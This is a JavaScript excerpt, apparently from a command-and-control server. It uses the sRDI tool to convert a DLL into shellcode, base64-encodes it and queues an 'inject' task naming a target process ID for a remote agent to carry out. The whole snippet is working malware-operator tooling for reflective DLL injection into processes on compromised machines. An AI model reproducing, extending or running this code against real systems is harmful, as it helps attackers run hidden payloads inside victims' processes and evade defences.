import {PythonShell} from 'python-shell';
let options = {
	mode: 'text',
	pythonOptions: ['-u'], // get print results in real-time
	scriptPath: 'lib/pythonModules/sRDI',
	args: [dll, '-c', '-i']
};

PythonShell.run('ConvertToShellcode.py', options, function (err, results) {
	if (err) throw err;
	let pieDLL = fs.readFileSync('data/tmp/output.bin');
	pieDLL = Buffer.from(pieDLL).toString('base64');
	fs.unlinkSync(`data/tmp/output.bin`);

	let comm = {"inject":{"pid": parseFloat(pid), "dll": `${pieDLL}`, "arch": `${arch}`}};
	if (fs.existsSync(`data/queue/${agentUUID}.json`)) {
		const data = JSON.parse(fs.readFileSync(`data/queue/${agentUUID}.json`));
		data['inject'] = comm['inject'];
		comm = data;
	}
	fs.writeFileSync(`data/queue/${agentUUID}.json`, JSON.stringify(comm));
});